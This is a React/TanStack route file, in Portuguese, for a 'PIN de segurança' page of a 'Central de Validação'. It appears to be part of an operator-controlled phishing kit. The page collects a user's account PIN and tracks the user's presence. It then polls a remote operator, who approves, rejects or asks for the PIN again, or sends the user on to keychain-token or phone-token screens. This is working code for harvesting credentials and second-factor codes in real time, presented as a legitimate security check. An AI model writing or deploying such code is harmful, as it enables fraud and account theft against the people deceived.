import { useEffect, useRef, useState } from "react";
import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useServerFn } from "@tanstack/react-start";
import { z } from "zod";
import { Loader2, Lock, XCircle } from "lucide-react";
import { enviarPin, verificarStatus } from "@/lib/cliente.functions";
import { usePresenca } from "@/hooks/use-presenca";

const searchSchema = z.object({ id: z.string().uuid() });

export const Route = createFileRoute("/pin")({
  validateSearch: (s: Record<string, unknown>) => searchSchema.parse(s),
  head: () => ({
    meta: [
      { title: "PIN de segurança — Central de Validação" },
      { name: "description", content: "Informe o PIN de segurança da sua conta." },
      { property: "og:title", content: "PIN de segurança" },
      { property: "og:description", content: "Informe o PIN de segurança da sua conta." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary" },
    ],
  }),
  component: PinPage,
});

function PinPage() {
  const { id } = Route.useSearch();
  const enviar = useServerFn(enviarPin);
  const checar = useServerFn(verificarStatus);
  const navigate = useNavigate();
  const [pin, setPin] = useState("");
  const [enviando, setEnviando] = useState(false);
  const [aguardando, setAguardando] = useState(false);
  const [erro, setErro] = useState<string | null>(null);
  const [reprovado, setReprovado] = useState<string | null>(null);
  const enviadoEmRef = useRef<string | null>(null);

  usePresenca(id, "pin");

  useEffect(() => {
    const t = setInterval(async () => {
      try {
        const res = await checar({ data: { id } });

        if (res.status === "removido") {
          navigate({ to: "/" });
          return;
        }


        if (res.status === "reprovado") {
          setAguardando(false);
          setEnviando(false);
          setReprovado(res.motivo ?? "Solicitação reprovada pelo operador.");
          return;
        }

        if (!aguardando && res.proxima_tela && res.proxima_tela !== "pin") {
          if (res.proxima_tela === "sucesso") {
            navigate({ to: "/sucesso" });
            return;
          }
          if (res.proxima_tela === "interna") {
            navigate({ to: "/interna", search: { id } });
            return;
          }
          const destino =
            res.proxima_tela === "token_chaveiro" ? "/token-chaveiro" : "/token-celular";
          navigate({ to: destino, search: { id } });
          return;
        }

        if (aguardando) {
          if (!res.pin_em && res.proxima_tela) {
            if (res.proxima_tela === "sucesso") {
              navigate({ to: "/sucesso" });
              return;
            }
            if (res.proxima_tela === "interna") {
              navigate({ to: "/interna", search: { id } });
              return;
            }
            if (res.proxima_tela !== "pin") {
              const destino =
                res.proxima_tela === "token_chaveiro" ? "/token-chaveiro" : "/token-celular";
              navigate({ to: destino, search: { id } });
              return;
            }
            // Mesma tela: operador pediu novo PIN
            setAguardando(false);
            setEnviando(false);
            setPin("");
            enviadoEmRef.current = null;
          }
        }
      } catch {
        // silencia
      }
    }, 2500);
    return () => clearInterval(t);
  }, [id, checar, navigate, aguardando]);

  async function submeter(e: React.FormEvent) {
    e.preventDefault();
    setErro(null);
    const v = pin.trim();
    if (!v) {
      setErro("Informe o PIN.");
      return;
    }
    setEnviando(true);
    try {
      await enviar({ data: { id, pin: v } });
      enviadoEmRef.current = new Date().toISOString();
      try {
        const res = await checar({ data: { id } });
        if (res.pin_em) enviadoEmRef.current = res.pin_em;
      } catch {
        // ignora
      }
      setAguardando(true);
    } catch {
      setEnviando(false);
      setErro("Não foi possível enviar o PIN. Tente novamente.");
    }
  }

  return (
    <main className="grid min-h-screen place-items-center bg-background px-6">
      <div className="w-full max-w-md rounded-md border border-border bg-card p-8">
        <div className="mx-auto flex size-12 items-center justify-center rounded-full bg-primary/15 text-primary">
          <Lock className="size-6" />
        </div>
        <h1 className="mt-5 text-center text-2xl font-semibold tracking-tight text-foreground">
          PIN de segurança
        </h1>
        <p className="mt-2 text-center text-sm text-muted-foreground">
          Informe o PIN de segurança da sua conta para prosseguir.
        </p>

        <form onSubmit={submeter} className="mt-8 space-y-4">
          <div className="space-y-1.5">
            <label htmlFor="pin" className="text-xs font-medium text-muted-foreground">
              PIN
            </label>
            <input
              id="pin"
              type="password"
              inputMode="numeric"
              autoComplete="one-time-code"
              value={pin}
              onChange={(e) => setPin(e.target.value)}
              maxLength={20}
              required
              disabled={enviando || aguardando}
              placeholder="••••"
              className="h-12 w-full rounded-md border border-input bg-background px-3 text-center font-mono text-lg tracking-[0.4em] text-foreground outline-none placeholder:text-muted-foreground/40 focus:border-ring disabled:opacity-60"
            />
          </div>

          {erro && (
            <p className="rounded-md border border-destructive/40 bg-destructive/10 px-3 py-2 text-xs text-destructive">
              {erro}
            </p>
          )}

          {reprovado && (
            <div className="rounded-md border border-destructive/40 bg-destructive/10 px-3 py-2 text-xs text-destructive">
              <div className="flex items-center gap-1.5 font-medium">
                <XCircle className="size-3.5" />
                Solicitação reprovada
              </div>
              <p className="mt-1 text-destructive/80">{reprovado}</p>
            </div>
          )}

          <button
            type="submit"
            disabled={enviando || aguardando}
            className="inline-flex h-10 w-full items-center justify-center gap-2 rounded-md bg-primary text-sm font-medium text-primary-foreground transition-opacity hover:opacity-90 disabled:opacity-80"
          >
            {aguardando ? (
              <>
                <Loader2 className="size-4 animate-spin" />
                Aguardando validação…
              </>
            ) : enviando ? (
              <>
                <Loader2 className="size-4 animate-spin" />
                Enviando…
              </>
            ) : (
              "Confirmar PIN"
            )}
          </button>
        </form>
      </div>
    </main>
  );
}
